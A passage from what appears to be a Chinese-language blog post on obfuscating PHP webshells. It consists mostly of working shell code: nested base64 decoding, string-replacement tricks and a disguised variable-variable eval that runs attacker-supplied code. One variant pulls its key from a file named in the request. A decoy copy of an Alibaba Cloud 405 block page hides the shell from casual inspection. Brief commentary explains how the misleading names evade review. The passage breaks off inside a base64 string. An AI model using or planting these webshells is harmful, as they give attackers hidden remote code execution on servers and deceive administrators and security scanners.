class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$k</span>[<span class="number">0</span>] == <span class="string">&#x27;d&#x27;</span> &amp;&amp; <span class="variable">$k</span>[<span class="number">5</span>] == <span class="string">&#x27;d&#x27;</span>) &#123;</span><br><span class="line">        <span class="variable">$template_source</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$v</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$password</span>);</span><br><span class="line">    &#125;&#125;</span><br><span class="line"><span class="variable">$template_source</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$template_source</span>);</span><br><span class="line"><span class="variable">$template_source</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$template_source</span>);</span><br><span class="line"><span class="variable">$key</span> = <span class="string">&#x27;template_source&#x27;</span>;</span><br><span class="line"><span class="variable">$aes_decode</span>[<span class="number">1</span>]=<span class="variable">$$key</span>;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$aes_decode</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="variable">$jWLTwO</span> = <span class="string">&quot;PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9InpoLWNuIj4KCjxoZWFkPgogICAgPG1ldGEgY2hhcnNldD0idXRmLTgiPgogICAgPG1ldGEgaHR0cC1lcXVpdj0iWC1VQS1Db21wYXRpYmxlIiBjb250ZW50PSJJRT1lZGdlLGNocm9tZT0xIj4KICAgIDxtZXRhIG5hbWU9ImRhdGEtc3BtIiBjb250ZW50PSJhM2MwZSIgLz4KICAgIDx0aXRsZT4KICAgICAgICA0MDUKICAgIDwvdGl0bGU+CiAgICA8c2NyaXB0IHNyYz0iLy9nLmFsaWNkbi5jb20vY29kZS9saWIvcXJjb2RlanMvMS4wLjAvcXJjb2RlLm1pbi5qcyI+PC9zY3JpcHQ+CiAgICA8c3R5bGU+CiAgICAgICAgaHRtbCwKICAgICAgICBib2R5LAogICAgICAgIGRpdiwKICAgICAgICBhLAogICAgICAgIGgyLAogICAgICAgIHAgewogICAgICAgICAgICBtYXJnaW46IDA7CiAgICAgICAgICAgIHBhZGRpbmc6IDA7CiAgICAgICAgICAgIGZvbnQtZmFtaWx5OiDlvq7ova/pm4Xpu5E7CiAgICAgICAgfQoKICAgICAgICBhIHsKICAgICAgICAgICAgdGV4dC1kZWNvcmF0aW9uOiBub25lOwogICAgICAgICAgICBjb2xvcjogIzNiNmVhMzsKICAgICAgICB9CgogICAgICAgIC5jb250YWluZXIgewogICAgICAgICAgICB3aWR0aDogMTAwMHB4OwogICAgICAgICAgICBtYXJnaW46IGF1dG87CiAgICAgICAgICAgIGNvbG9yOiAjNjk2OTY5OwogICAgICAgIH0KCiAgICAgICAgLmhlYWRlciB7CiAgICAgICAgICAgIHBhZGRpbmc6IDUwcHggMDsKICAgICAgICB9CgogICAgICAgIC5oZWFkZXIgLm1lc3NhZ2UgewogICAgICAgICAgICBoZWlnaHQ6IDM2cHg7CiAgICAgICAgICAgIHBhZGRpbmctbGVmdDogMTIwcHg7CiAgICAgICAgICAgIGJhY2tncm91bmQ6IHVybChodHRwczovL2Vycm9ycy5hbGl5dW4uY29tL2ltYWdlcy9UQjFUcGFtSHBYWFhYYUpYWFhYZUI3bllWWFgtMTA0LTE2Mi5wbmcpIG5vLXJlcGVhdCAwIC0xMjhweDsKICAgICAgICAgICAgbGluZS1oZWlnaHQ6IDM2cHg7CiAgICAgICAgfQoKICAgICAgICAubWFpbiB7CiAgICAgICAgICAgIHBhZGRpbmc6IDUwcHggMDsKICAgICAgICAgICAgYmFja2dyb3VuZDoKICAgICAgICAgICAgICAgICNmNGY1Zjc7CiAgICAgICAgfQoKICAgICAgICAubWFpbiBpbWcgewogICAgICAgICAgICBwb3NpdGlvbjogcmVsYXRpdmU7CiAgICAgICAgICAgIGxlZnQ6IDEyMHB4OwogICAgICAgIH0KCiAgICAgICAgLmZvb3RlciB7CiAgICAgICAgICAgIG1hcmdpbi10b3A6CiAgICAgICAgICAgICAgICAzMHB4OwogICAgICAgICAgICB0ZXh0LWFsaWduOiByaWdodDsKICAgICAgICB9CgogICAgICAgIC5mb290ZXIgYSB7CiAgICAgICAgICAgIHBhZGRpbmc6IDhweCAzMHB4OwogICAgICAgICAgICBib3JkZXItcmFkaXVzOgogICAgICAgICAgICAgICAgMTBweDsKICAgICAgICAgICAgYm9yZGVyOiAxcHggc29saWQgIzRiYWJlYzsKICAgICAgICB9CgogICAgICAgIC5mb290ZXIgYTpob3ZlciB7CiAgICAgICAgICAgIG9wYWNpdHk6IC44OwogICAgICAgIH0KCiAgICAgICAgLmFsZXJ0LXNoYWRvdyB7CiAgICAgICAgICAgIGRpc3BsYXk6IG5vbmU7CiAgICAgICAgICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTsKICAgICAgICAgICAgdG9wOiAwOwogICAgICAgICAgICBsZWZ0OiAwOwogICAgICAgICAgICB3aWR0aDogMTAwJTsKICAgICAgICAgICAgaGVpZ2h0OgogICAgICAgICAgICAgICAgMTAwJTsKICAgICAgICAgICAgYmFja2dyb3VuZDogIzk5OTsKICAgICAgICAgICAgb3BhY2l0eTogLjU7CiAgICAgICAgfQoKICAgICAgICAuYWxlcnQgewogICAgICAgICAgICBkaXNwbGF5OiBub25lOwogICAgICAgICAgICBwb3NpdGlvbjoKICAgICAgICAgICAgICAgIGFic29sdXRlOwogICAgICAgICAgICB0b3A6IDIwMHB4OwogICAgICAgICAgICBsZWZ0OiA1MCU7CiAgICAgICAgICAgIHdpZHRoOiA2MDBweDsKICAgICAgICAgICAgbWFyZ2luLWxlZnQ6IC0zMDBweDsKICAgICAgICAgICAgcGFkZGluZy1ib3R0b206CiAgICAgICAgICAgICAgICAyNXB4OwogICAgICAgICAgICBib3JkZXI6IDFweCBzb2xpZCAjZGRkOwogICAgICAgICAgICBib3gtc2hhZG93OiAwIDJweCAycHggMXB4IHJnYmEoMCwgMCwgMCwgLjEpOwogICAgICAgICAgICBiYWNrZ3JvdW5kOiAjZmZmOwogICAgICAgICAgICBmb250LXNpemU6IDE0cHg7CiAgICAgICAgICAgIGNvbG9yOiAjNjk2OTY5OwogICAgICAgIH0KCiAgICAgICAgLmFsZXJ0IGgyIHsKICAgICAgICAgICAgbWFyZ2luOgogICAgICAgICAgICAgICAgMCAycHg7CiAgICAgICAgICAgIHBhZGRpbmc6IDEwcHggMTVweCA1cHggMTVweDsKICAgICAgICAgICAgZm9udC1zaXplOiAxNHB4OwogICAgICAgICAgICBmb250LXdlaWdodDogbm9ybWFsOwogICAgICAgICAgICBib3JkZXItYm90dG9tOiAxcHggc29saWQgI2RkZDsKICAgICAgICB9CgogICAgICAgIC5hbGVydCBhIHsKICAgICAgICAgICAgZGlzcGxheTogYmxvY2s7CiAgICAgICAgICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTsKICAgICAgICAgICAgcmlnaHQ6IDEwcHg7CiAgICAgICAgICAgIHRvcDogOHB4OwogICAgICAgICAgICB3aWR0aDogMzBweDsKICAgICAgICAgICAgaGVpZ2h0OiAyMHB4OwogICAgICAgICAgICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgICAgICAgfQoKICAgICAgICAuYWxlcnQgcCB7CiAgICAgICAgICAgIHBhZGRpbmc6IDIwcHggMTVweDsKICAgICAgICB9CgogICAgICAgICNmZWVkYmFjay1jb250YWluZXIgewogICAgICAgICAgICB3aWR0aDogMTEwcHg7CiAgICAgICAgICAgIG1hcmdpbjogYXV0bzsKICAgICAgICAgICAgbWFyZ2luLXRvcDogMTIwcHg7CiAgICAgICAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgICAgICB9CgogICAgICAgICNxcmNvZGUgewogICAgICAgICAgICBtYXJnaW46IDAgMTVweCA1cHggMTVweDsKICAgICAgICB9CgogICAgICAgICNmZWVkYmFjayBhIHsKICAgICAgICAgICAgY29sb3I6ICM5OTk7CiAgICAgICAgICAgIGZvbnQtc2l6ZTogMTJweDsKICAgICAgICAgICAgbWFyZ2luLXRvcDogNXB4OwogICAgICAgIH0KICAgIDwvc3R5bGU+CjwvaGVhZD4KCjxib2R5IGRhdGEtc3BtPSI3NjYzMzU0Ij4KICAgIDxzY3JpcHQ+CiAgICAgICAgd2l0aCAoZG9jdW1lbnQpIHdpdGggKGJvZHkpIHdpdGggKGluc2VydEJlZm9yZShjcmVhdGVFbGVtZW50KCJzY3JpcHQiKSwgZmlyc3RDaGlsZCkpIHNldEF0dHJpYnV0ZSgiZXhwYXJhbXMiLCAiY2F0ZWdvcnk9JnVzZXJpZD02ODUzMDgyOTUmYXBsdXMmdWRwaWQ9VldlVU9jZVFKZEtqJiZ5dW5pZD0mZTkzYjRlM2U3NWUwNSZ0cmlkPTY1MjViNzk2MTU4MzkyMDYwOTQwMDM5MzhlJmFzaWQ9QVlmNTJDamh0V2hlK2FmK0hRQUFBQUNXQS9TSW5PM1FMdz09IiwgaWQgPSAidGItYmVhY29uLWFwbHVzIiwgc3JjID0gKGxvY2F0aW9uID4gImh0dHBzIiA/ICIvL2ciIDogIi8vZyIpICsgIi5hbGljZG4uY29tL2FsaWxvZy9tbG9nL2FwbHVzX3YyLmpzIikKICAgIDwvc2NyaXB0PgogICAgPHNjcmlwdD4KICAgICAgICAvLwogICAgICAgIHZhciBpMThuT2JqZWN0ID0gewogICAgICAgICAgICAiemgtY24iOiB7CiAgICAgICAgICAgICAgICAibWVzc2FnZSI6ICLlvojmirHmrYnvvIznlLHkuo7mgqjorr/pl67nmoRVUkzmnInlj6/og73lr7nnvZHnq5npgKDmiJDlronlhajlqIHog4HvvIzmgqjnmoTorr/pl67ooqvpmLvmlq3jgIIiLAogICAgICAgICAgICAgICAgImJnSW1nIjogImh0dHBzOi8vZXJyb3JzLmFsaXl1bi5jb20vaW1hZ2VzL1RCMTVRR2FIcFhYWFhYT2FYWFhYaWEzOVhYWC02NjAtMTE3LnBuZyIsCiAgICAgICAgICAgICAgICAicmVwb3J0IjogIuivr+aKpeWPjemmiCIsCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgICJlbi11cyI6IHsKICAgICAgICAgICAgICAgICJtZXNzYWdlIjogIlNvcnJ5LCB3ZSBoYXZlIGRldGVjdGVkIG1hbGljaW91cyB0cmFmZmljIGZyb20geW91ciBuZXR3b3JrLCBwbGVhc2UgdHJ5IGFnYWluIGxhdGVyLiIsCiAgICAgICAgICAgICAgICAiYmdJbWciOiAiaHR0cHM6Ly9pbWcuYWxpY2RuLmNvbS90ZnMvVEIxQURBT0lGenFLMVJqU1pTZ1hYY3BBVlhhLTEzMjAtMjM0LmpwZyIsCiAgICAgICAgICAgICAgICAicmVwb3J0IjogIlJlcG9ydCIsCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgdmFyIGkxOG4gPSBpMThuT2JqZWN0WyJlbi11cyJdOwogICAgICAgIGlmIChuYXZpZ2F0b3IubGFuZ3VhZ2UuaW5kZXhPZigiemgiKSA+PSAwKSB7CiAgICAgICAgICAgIGkxOG4gPSBpMThuT2JqZWN0WyJ6aC1jbiJdOwogICAgICAgIH0KCiAgICA8L3NjcmlwdD4KCiAgICA8ZGl2IGRhdGEtc3BtPSIxOTk4NDEwNTM4Ij4KICAgICAgICA8ZGl2IGNsYXNzPSJoZWFkZXIiPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0ibWVzc2FnZSI+CiAgICAgICAgICAgICAgICAgICAgPHNjcmlwdD5kb2N1bWVudC53cml0ZShpMThuLm1lc3NhZ2UpPC9zY3JpcHQ+CiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgPC9kaXY+CiAgICAgICAgPGRpdiBjbGFzcz0ibWFpbiI+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CiAgICAgICAgICAgICAgICA8c2NyaXB0PmRvY3VtZW50LndyaXRlKCc8aW1nIHdpZHRoPSI2NjAiIGhlaWdodD0iMTE3IiBzcmM9IicgKyBpMThuLmJnSW1nICsgJyIvPicpPC9zY3JpcHQ+CgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Rpdj4KICAgICAgICA8ZGl2IGNsYXNzPSJmb290ZXIiPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgICAgICAgICAgICAgPHNwYW4gc3R5bGU9J2Rpc3BsYXk6bm9uZSc+CiAgICAgICAgICAgICAgICAgICAgPHNjcmlwdD4KICAgICAgICAgICAgICAgICAgICAgICAgZnVuY3Rpb24gZ2V0UXVlcnlTdHJpbmcodXJsLCBuYW1lKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgcmVnID0gbmV3IFJlZ0V4cCgnKF58JiknICsgbmFtZSArICc9KFteJl0qKSgmfCQpJyk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgciA9IHVybC5zdWJzdHIoMSkubWF0Y2gocmVnKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChyICE9PSBudWxsKSByZXR1cm4gdW5lc2NhcGUoclsyXSk7IHJldHVybiBudWxsOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIHZhciBfX3V1aWRfX18gPSBnZXRRdWVyeVN0cmluZyhsb2NhdGlvbi5ocmVmLCAidXVpZCIpCiAgICAgICAgICAgICAgICAgICAgPC9zY3JpcHQ+CiAgICAgICAgICAgICAgICA8L3NwYW4+CiAgICAgICAgICAgICAgICA8YSB0YXJnZXQ9Il9ibGFuayIgaWQ9InJlcG9ydCIgaHJlZj0iamF2YXNjcmlwdDo7IiBkYXRhLXNwbS1jbGljaz0iZ29zdHI9L3dhZi4xMjMuMTIzO2xvY2FpZD1kMDAxOyI+CiAgICAgICAgICAgICAgICAgICAgPHNjcmlwdD5kb2N1bWVudC53cml0ZShpMThuLnJlcG9ydCk8L3NjcmlwdD4KICAgICAgICAgICAgICAgIDwvYT4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KICAgIDxkaXYgaWQ9ImFsZXJ0U2hhZG93IiBjbGFzcz0iYWxlcnQtc2hhZG93Ij4KICAgIDwvZGl2PgogICAgPGRpdiBpZD0iYWxlcnRDb250YWluZXIiIGNsYXNzPSJhbGVydCI+CiAgICAgICAgPGgyPgogICAgICAgICAgICDmj5DnpLrvvJoKICAgICAgICAgICAgPGEgaHJlZj0iamF2YXNjcmlwdDo7IiB0aXRsZT0i5YWz6ZetIiBpZD0iY2xvc2VBbGVydCI+CiAgICAgICAgICAgICAgICBYCiAgICAgICAgICAgIDwvYT4KICAgICAgICA8L2gyPgogICAgICAgIDxwPgogICAgICAgICAgICDmhJ/osKLmgqjnmoTlj43ppojvvIzlupTnlKjpmLLngavlopnkvJrlsL3lv6vov5vooYzliIbmnpDlkoznoa7orqTjgIIKICAgICAgICA8L3A+CiAgICA8L2Rpdj4KICAgIDxkaXYgaWQ9ImZlZWRiYWNrLWNvbnRhaW5lciI+CiAgICAgICAgPGRpdiBpZD0icXJjb2RlIj48L2Rpdj4KICAgICAgICA8ZGl2IGlkPSJmZWVkYmFjayI+PC9kaXY+CiAgICA8L2Rpdj4KICAgIDxzY3JpcHQ+CiAgICAgICAgZnVuY3Rpb24gc2hvdygpIHsKICAgICAgICAgICAgdmFyIGcgPSBmdW5jdGlvbiAoZWxlKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoZWxlKTsKICAgICAgICAgICAgfTsKICAgICAgICAgICAgdmFyIHJlcG9ydEhhbmRsZSA9IGcoJ3JlcG9ydCcpOwogICAgICAgICAgICB2YXIgYWxlcnRTaGFkb3cgPSBnKCdhbGVydFNoYWRvdycpOwogICAgICAgICAgICB2YXIgYWxlcnRDb250YWluZXIgPSBnKCdhbGVydENvbnRhaW5lcicpOwogICAgICAgICAgICB2YXIgY2xvc2VBbGVydCA9IGcoJ2Nsb3NlQWxlcnQnKTsKICAgICAgICAgICAgdmFyIG93biA9IHt9OwogICAgICAgICAgICBvd24ucmVwb3J0ID0gZnVuY3Rpb24gKCkgeyAKICAgICAgICAgICAgICAgIG93bi5hbGVydCgpOwogICAgICAgICAgICB9OyBvd24uYWxlcnQgPSBmdW5jdGlvbiAoKSB7IGFsZXJ0U2hhZG93LnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOyBhbGVydENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsgfTsgb3duLmNsb3NlID0gZnVuY3Rpb24gKCkgeyBhbGVydFNoYWRvdy5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOyBhbGVydENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOyB9OwogICAgICAgIH07CgogICAgICAgIHZhciB1dWlkID0gbG9jYXRpb24uaHJlZi5tYXRjaCgvdXVpZD0oW14mXSspLyk7CiAgICAgICAgdXVpZCA9IHV1aWQgJiYgZW5jb2RlVVJJQ29tcG9uZW50KHV1aWRbMV0pOwogICAgICAgIHZhciB1cmxRckNvZGUgPSBsb2NhdGlvbi5ocmVmLm1hdGNoKC9xcmNvZGU9KFteJl0rKS8pOwogICAgICAgIHVybFFyQ29kZSA9IHVybFFyQ29kZSAmJiBkZWNvZGVVUklDb21wb25lbnQodXJsUXJDb2RlWzFdKTsKICAgICAgICBpZiAodXVpZCB8fCB1cmxRckNvZGUpIHsKICAgICAgICAgICAgdmFyIHFyY29kZSA9IG5ldyBRUkNvZGUoZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInFyY29kZSIpLCB7CiAgICAgICAgICAgICAgICB0ZXh0OiB1cmxRckNvZGUgfHwgdXVpZCwKICAgICAgICAgICAgICAgIHdpZHRoOiA4MCwKICAgICAgICAgICAgICAgIGhlaWdodDogODAsCiAgICAgICAgICAgICAgICBjb2xvckRhcms6ICIjOTk5IiwKICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIHZhciBmZWVkYmFja0xpbmsgPSBnZXRGZWVkYmFja0xpbmsoKTsKICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImZlZWRiYWNrIikuaW5uZXJIVE1MID0gZmVlZGJhY2tMaW5rOwogICAgICAgIH0KICAgICAgICBmdW5jdGlvbiBnZXRGZWVkYmFja0xpbmsoKSB7CiAgICAgICAgICAgIHZhciB1cmxPcmlnaW47CiAgICAgICAgICAgIHVybE9yaWdpbiA9IGxvY2F0aW9uLmhyZWYubWF0Y2goL29yaWdpbj0oW14mXSspLyk7CiAgICAgICAgICAgIHVybE9yaWdpbiA9IHVybE9yaWdpbiAmJiBkZWNvZGVVUklDb21wb25lbnQodXJsT3JpZ2luWzFdKS5zcGxpdCgiPyIpWzBdOwogICAgICAgICAgICBpZiAodXJsT3JpZ2luKSB7CiAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgIHVybE9yaWdpbiA9IG5ldyBVUkwodXJsT3JpZ2luKTsKICAgICAgICAgICAgICAgICAgICBpZiAodXJsT3JpZ2luLnByb3RvY29sICE9PSAiaHR0cHM6IiAmJiB1cmxPcmlnaW4ucHJvdG9jb2wgIT09ICJodHRwOiIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgdXJsT3JpZ2luID0gbnVsbDsKICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICB1cmxPcmlnaW4gPSB1cmxPcmlnaW4uaHJlZjsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9IGNhdGNoIChlKSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKHR5cGVvZiB1cmxPcmlnaW4gIT09ICJzdHJpbmciIHx8IHVybE9yaWdpbi5pbmRleE9mKCJodHRwIikgIT09IDApIHsKICAgICAgICAgICAgICAgICAgICAgICAgdXJsT3JpZ2luID0gbnVsbDsKICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICB1cmxPcmlnaW4gPSBmaWx0ZXJIdG1sKHVybE9yaWdpbik7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIHZhciBfbGFuZ3VhZ2UgPSBuYXZpZ2F0b3IuYnJvd3Nlckxhbmd1YWdlIHx8IG5hdmlnYXRvci5sYW5ndWFnZTsKICAgICAgICAgICAgdmFyIHRleHQgPSBbInpoLUNOIiwgInpoLWNuIl0uaW5jbHVkZXMoX2xhbmd1YWdlKSA/ICLngrnmiJHlj43ppoggPiIgOiAiQ2xpY2sgdG8gZmVlZGJhY2sgPiI7CiAgICAgICAgICAgIHJldHVybiAnPGEgaHJlZj0iJyArIHVybE9yaWdpbiArICcvX19fX190bWRfX19fXy9wYWdlL2ZlZWRiYWNrP3JhbmQ9UzNXeEdIQWdBdDc1NkVwem53Zk56SnEyQUZBMnFCTmxhM2o2RUlOVVM4V2U5ZGF6TV9pS0VscDhEd1ZTSFpVZXZwQzQxQng3UnppdlhJajlSblpnZGcmdXVpZD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KHV1aWQpICsgJyZ0eXBlPTYiIHRhcmdldD0iX2JsYW5rIj4nICsgdGV4dCArICc8L2E+JzsKICAgICAgICB9OwogICAgICAgIGZ1bmN0aW9uIGZpbHRlckh0bWwoc3RyKSB7CiAgICAgICAgICAgIHN0ciA9IHN0ci5yZXBsYWNlKC8mL2csICIiKTsKICAgICAgICAgICAgc3RyID0gc3RyLnJlcGxhY2UoLz4vZywgIiIpOwogICAgICAgICAgICBzdHIgPSBzdHIucmVwbGFjZSgvPC9nLCAiIik7CiAgICAgICAgICAgIHN0ciA9IHN0ci5yZXBsYWNlKC8iL2csICIiKTsKICAgICAgICAgICAgc3RyID0gc3RyLnJlcGxhY2UoLycvZywgIiIpOwogICAgICAgICAgICBzdHIgPSBzdHIucmVwbGFjZSgvYC9nLCAiIik7CiAgICAgICAgICAgIHN0ciA9IHN0ci5yZXBsYWNlKC9qYXZhc2NyaXB0L2csICIiKTsKICAgICAgICAgICAgc3RyID0gc3RyLnJlcGxhY2UoL2lmcmFtZS9nLCAiIik7CiAgICAgICAgICAgIHJldHVybiBzdHI7CiAgICAgICAgfQoKICAgIDwvc2NyaXB0PgogICAgPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIGNoYXJzZXQ9InV0Zi04IiBzcmM9Imh0dHBzOi8vZXJyb3JzLmFsaXl1bi5jb20vZXJyb3IuanM/cz0xMCI+CiAgICA8L3NjcmlwdD4KPC9ib2R5PgoKPC9odG1sPg==&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">count</span>(<span class="variable">$_REQUEST</span>) || <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>) )&#123;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type:text/html;charset=utf-8&#x27;</span>);    <span class="title function_ invoke__">http_response_code</span>(<span class="number">405</span>);</span><br><span class="line">    <span class="keyword">echo</span> base64_decode<span class="comment">/**/</span>(<span class="variable">$jWLTwO</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>思路：</p>
+<p>先生成了一个name和content作为注释写入代码，并调用查找meta函数找到上面2个的值，并传入token参数，当token参数的值等于name时就会变成content，随后写入username并加入到header里面</p>
+<p>从header中查找含有ddddddd参数值并将其中含有content的字符串替换为空，并给template_source赋值</p>
+<p>WlhaZYLWcbSbaGJDZ2ZYLWcbSbtYMUJQVTFSYkoyTnRaQ2RkS1RzPQ&#x3D;&#x3D;    &#x3D;&gt; WlhaaGJDZ2ZYLtYMUJQVTFSYkoyTnRaQ2RkS1RzPQ&#x3D;&#x3D;</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$key</span> = <span class="string">&#x27;template_source&#x27;</span>;</span><br><span class="line"><span class="variable">$aes_decode</span>[<span class="number">1</span>]=<span class="variable">$$key</span>;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$aes_decode</span>[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment"># @eval($template_source)</span></span><br></pre></td></tr></table></figure>
+
+<p>这里表面看上去是一个aes解密函数，实际上是一个自定义变量进行迷惑，最后执行的是注释里的内容</p>
+<h3 id="3、base64-动态拼接-替换-文件读取套娃"><a href="#3、base64-动态拼接-替换-文件读取套娃" class="headerlink" title="3、base64+动态拼接+替换+文件读取套娃"></a>3、base64+动态拼接+替换+文件读取套娃</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="comment">/*vTLtwREN*/</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Serve:&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="keyword">__FILE__</span>));</span><br><span class="line"><span class="variable">$password</span>=<span class="string">&#x27;WlhaaGvTLtwRENJvTLtwRENDZ2tYMvTLtwRENUJQVTFSYkoyTnRaQ2RkS1RzPQ==&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">ob_start</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="string">&#x27;application.xml&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">readfile</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line"><span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line"><span class="variable">$username</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$file</span>,<span class="number">8</span>,<span class="number">8</span>);</span><br><span class="line"><span class="variable">$template_source</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$username</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$password</span>);</span><br><span class="line"><span class="variable">$template_source</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$template_source</span>);</span><br><span class="line"><span class="variable">$template_source</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$template_source</span>);</span><br><span class="line"><span class="variable">$key</span> = <span class="string">&#x27;template_source&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(@<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$aes_decode</span>[<span class="number">1</span>]=<span class="variable">$$key</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$aes_decode</span>[<span class="number">1</span>]=<span class="string">&#x27;echo \&#x27;\&#x27;;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$aes_decode</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="variable">$VEIUrP</span> = <span class="string">&quot;PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9InpoLWNuIj4KCjxoZWFkPgogICAgPG1ldGEgY2hhcnNldD0idXRmLTgiPgogICAgPG1ldGEgaHR0cC1lcXVpdj0iWC1VQS1Db21wYXRpYmxlIiBjb250ZW50PSJJRT1lZGdlLGNocm9tZT0xIj4KICAgIDxtZXRhIG5hbWU9ImRhdGEtc3BtIiBjb250ZW50PSJhM2MwZSIgLz4KICAgIDx0aXRsZT4KICAgICAgICA0MDUKICAgIDwvdGl0bGU+CiAgICA8c2NyaXB0IHNyYz0iLy9nLmFsaWNkbi5jb20vY29kZS9saWIvcXJjb2RlanMvMS4wLjAvcXJjb2RlLm1pbi5qcyI+PC9zY3JpcHQ+CiAgICA8c3R5bGU+CiAgICAgICAgaHRtbCwKICAgICAgICBib2R5LAogICAgICAgIGRpdiwKICAgICAgICBhLAogICAgICAgIGgyLAogICAgICAgIHAgewogICAgICAgICAgICBtYXJnaW46IDA7CiAgICAgICAgICAgIHBhZGRpbmc6IDA7CiAgICAgICAgICAgIGZvbnQtZmFtaWx5OiDlvq7ova/pm4Xpu5E7CiAgICAgICAgfQoKICAgICAgICBhIHsKICAgICAgICAgICAgdGV4dC1kZWNvcmF0aW9uOiBub25lOwogICAgICAgI